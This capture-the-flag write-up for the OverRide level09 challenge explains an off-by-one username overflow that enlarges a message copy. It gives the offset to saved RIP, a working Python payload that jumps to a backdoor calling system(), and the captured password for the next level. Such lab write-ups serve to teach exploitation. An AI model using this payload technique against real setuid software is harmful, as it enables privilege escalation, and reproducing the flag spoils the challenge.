# LEVEL09

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$ ls -l
total 16
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`end` privileges**.


## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 5 functions: `main`, `handle_msg`, `set_username`, `set_msg`,  and `secret_backdoor`.

### Program Behavior

#### Structure Layout

The program uses a **structure** in `handle_msg` :

```c
typedef struct s_text {
    char message[140];      // 0x8c bytes (offset 0x00)
    char username[40];   // 0x28 bytes (offset 0x8c)
    int length;          // 4 bytes     (offset 0xb4)
}	t_text;
```

#### main function

The `main` function simply **prints a banner** and **calls** `handle_msg()`.

#### handle_msg function

The `handle_msg` function creates a **`t_text` structure** on the stack, **`local_c8`**. It sets its **`length` variable** at **`0x8c`** (140 in decimal).
Then **calls** `set_username()` and `set_msg()` to **set** the **`t_text` variables**. Finally, it prints `"Msg sent!"` and returns.

#### set_username function

The `set_username` function **reads up** to `0x80` bytes (128 in decimal) with `fgets()`, then **copies** up to `0x29` bytes (41 in decimal) into the **username field**.

#### set_msg function

The `set_msg` function **reads up** to `0x400` bytes (1024) into a temporary buffer, then uses `strncpy()` to **copy** `local_c8.length` bytes into the **message field**.

#### secret_backdoor function

The `secret_backdoor` function is **never called** in normal execution. It **reads** `0x80` bytes (128 in decimal) with `fgets()` and passes them directly to **`system()`**.

## 3. Identify The Vulnerability

The goal is to **overflow** the `SAVED RIP` with the address of `secret_backdoor`.

*(**Note**: This is a 64-bit binary, so registers are RBP, RSP, and RIP (8 bytes each), not EBP, ESP, and EIP (4 bytes).)*

### Get The Exploit Values

#### Overflow `local_c8.length`

At first it looks like no overflow is possible. The **read** for the **message** in `set_msg()` is **limited** at **`text->length`**.

But the **read** for the **username** in `set_username` is limited at **41 characters** while the username is only **40 characters**. So the **last character** can overwrite the **first byte** of the **length variable** of the structure. The size of the read for the message can be **increased**.

We can only affect the **1st byte**, from `0` to `ff` (256 in decimal). This gives a first part payload as follows :

```bash
python -c "print 'a' * 40 + '\xff' + '\n'"
```

*(`\n` is there to simulate the enter to write the 2nd input.)*

---

#### Calculate The Offset

From this assembly dump :

```asm
0x00000000000008c0 <+0>:  push   %rbp
0x00000000000008c1 <+1>:  mov    %rsp,%rbp
0x00000000000008c4 <+4>:  sub    $0xc0,%rsp
0x00000000000008cb <+11>: lea    -0xc0(%rbp),%rax
```

The **structure** is at `RBP - 0xc0` (192 bytes *(in decimal)* from `RBP`).

The `SAVED RIP` is at `RBP + 8`, so :

```
Offset = (RBP + 8) - (RBP - 0xc0)
       = 8 + 192
       = 200 bytes
```

We need **`200` bytes** of padding to reach the `SAVED RIP`.

---

#### Find `secret_backdoor` Address

Because **PIE** is **enabled**, we need to find the address during runtime :

```bash
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor 
$1 = {} 0x55555555488c 
```

The address is **`0x55555555488c`**.

*(PIE randomizes the base address of the binary at each execution, but the offset of functions within the binary remains constant.)*

---

Then `secret_backdoor` uses `fgets()` to get the argument of `system()`, so we can put it in the payload.


### Create The Payload

```bash
python -c "print 'a' * 40 + '\xff' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"
```

*(We can then pipe `/bin/sh` or `cat /home/users/end/.pass` or commands directly to `secret_backdoor` with its `fgets()`.)*


## 4. Capture The Flag

```bash
level09@OverRide:~$ (python -c "print 'a' * 40 + '\xff' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'"; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```

---

## 5. Successfully Complete !

```bash
level09@OverRide:~$ su end
Password: 
end@OverRide:~$ ls -l
total 4
-rwsr-s---+ 1 end users 5 Sep 10  2016 end
end@OverRide:~$ cat end 
GG !
```